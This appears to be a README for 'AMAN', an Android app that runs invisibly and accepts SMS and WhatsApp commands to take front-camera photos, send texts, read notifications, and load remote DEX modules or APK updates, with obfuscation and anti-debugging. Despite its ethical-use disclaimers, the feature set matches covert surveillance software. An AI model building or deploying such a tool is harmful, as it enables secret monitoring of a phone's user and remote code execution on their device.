# AMAN - Secure Android Background Agent

AMAN is a secure, ethical Android background agent app that provides device automation via SMS and WhatsApp commands. It operates invisibly in the background and accepts commands only from pre-defined authorized numbers.

## Features

✅ **Background Operation**: Runs invisibly without UI  
✅ **SMS Command Processing**: Accepts commands via SMS from authorized numbers  
✅ **WhatsApp Monitoring**: Reads WhatsApp notifications for commands  
✅ **Secure Authentication**: Master number system with encrypted storage  
✅ **Camera Integration**: Take photos using CameraX and send via SMS/WhatsApp  
✅ **Dynamic Module System**: Load and execute custom modules securely  
✅ **Security Features**: ProGuard obfuscation, anti-tampering, integrity checks  
✅ **Learning Capability**: Learn and repeat frequently used commands  
✅ **Self-Update**: Update capability via secure commands  

## Security Features

- **ProGuard Obfuscation**: Class and method names are obfuscated
- **Anti-Debugging**: Detects debugging attempts and enables enhanced security
- **Root Detection**: Monitors for root access
- **App Integrity**: Verifies app signature and prevents tampering
- **Secure Storage**: Uses Android Keystore for sensitive data
- **Module Sandbox**: Tests modules in isolated environment before loading

## Setup Instructions

### 1. Build the Project

```bash
cd AMAN
./gradlew assembleRelease
```

### 2. Install the APK

```bash
adb install app/build/outputs/apk/release/app-release.apk
```

### 3. Grant Permissions

The app requires the following permissions:
- SMS (Send/Receive)
- Camera
- Notification Access
- Storage
- Phone State

### 4. Set Master Number

Send the following SMS to set up the master number:

```
AMAN_SETUP:SET_MASTER
```

This will register the sender's number as the master number.

## Command Usage

### Basic Commands

All commands must be prefixed with `AMAN:` in SMS or WhatsApp.

#### Status Commands
```
AMAN:status                    # Get agent status
AMAN:pause                     # Pause the agent
AMAN:unpause                   # Resume the agent
AMAN:help                      # Show help information
```

#### SMS Commands
```
AMAN:sms to=1234567890 message=Hello    # Send SMS
```

#### Camera Commands
```
AMAN:photo                              # Take photo with back camera
AMAN:photo camera=front                 # Take photo with front camera
AMAN:photo camera=back quality=90       # Take high quality photo
AMAN:photo send_to=1234567890           # Take photo and send to number
```

#### Number Management (Master Only)
```
AMAN:add_number number=1234567890       # Add authorized number
AMAN:remove_number number=1234567890    # Remove authorized number
AMAN:list_numbers                       # List authorized numbers
```

#### Module Management (Master Only)
```
AMAN:load_module name=TestModule url=https://example.com/module.dex
AMAN:list_modules                       # List loaded modules
```

#### Learning Commands
```
AMAN:learn command=morning action="sms to=1234567890 message=Good morning"
```

#### System Commands (Master Only)
```
AMAN:update url=https://example.com/update.apk    # Self-update
AMAN:shutdown                                      # Emergency shutdown
```

## Module Development

### Creating Custom Modules

1. Implement the `BaseModule` interface:

```kotlin
class MyCustomModule : AbstractBaseModule() {
    
    override fun getName(): String = "MyCustomModule"
    override fun getVersion(): String = "1.0.0"
    override fun getDescription(): String = "Custom module description"
    
    override fun getSupportedCommands(): List<String> {
        return listOf("custom_command", "another_command")
    }
    
    override suspend fun onExecuteCommand(
        command: String,
        parameters: Map<String, String>,
        sender: String
    ): String {
        return when (command) {
            "custom_command" -> handleCustomCommand(parameters)
            else -> "Unknown command"
        }
    }
    
    private fun handleCustomCommand(parameters: Map<String, String>): String {
        // Your custom logic here
        return "Custom command executed"
    }
}
```

2. Compile to DEX format
3. Upload to accessible URL
4. Load via `load_module` command

### Module Security

- All modules are tested in a secure sandbox before loading
- Memory usage is monitored
- Execution time is limited
- Security manager prevents dangerous operations

## Security Considerations

### Ethical Use Only

This app is designed for legitimate device automation by the device owner. It should NOT be used for:
- Unauthorized surveillance
- Malicious activities
- Privacy violations
- Illegal purposes

### Permissions

All permissions are declared transparently and used only for their intended purposes:
- SMS: For command processing and responses
- Camera: For photo capture commands
- Notifications: For WhatsApp command monitoring
- Storage: For photo and log storage

### Data Protection

- All sensitive data is encrypted using Android Keystore
- No data is transmitted to external servers without explicit commands
- Logs are stored locally and can be cleared
- Backup is disabled for sensitive data

## Troubleshooting

### Agent Not Responding

1. Check if service is running: `AMAN:status`
2. Verify master number is set
3. Ensure agent is not paused
4. Check permissions are granted

### Commands Not Working

1. Verify command format (must start with `AMAN:`)
2. Check sender is authorized
3. Ensure agent is active
4. Review command syntax

### Module Loading Issues

1. Verify module URL is accessible
2. Check module implements BaseModule interface
3. Ensure module passes sandbox tests
4. Review module logs for errors

## Development

### Project Structure

```
AMAN/
├── app/
│   ├── src/main/
│   │   ├── java/com/aman/agent/
│   │   │   ├── services/          # Background services
│   │   │   ├── commands/          # Command processing
│   │   │   ├── security/          # Security management
│   │   │   ├── modules/           # Module system
│   │   │   ├── utils/             # Utilities
│   │   │   └── data/              # Database
│   │   ├── res/                   # Resources
│   │   └── AndroidManifest.xml
│   ├── build.gradle
│   └── proguard-rules.pro
├── build.gradle
└── settings.gradle
```

### Building

```bash
# Debug build
./gradlew assembleDebug

# Release build (with obfuscation)
./gradlew assembleRelease

# Run tests
./gradlew test
```

## License

This project is for educational and legitimate automation purposes only. Use responsibly and in compliance with local laws and regulations.

## Disclaimer

The developers are not responsible for misuse of this software. Users must ensure compliance with applicable laws and respect privacy rights.
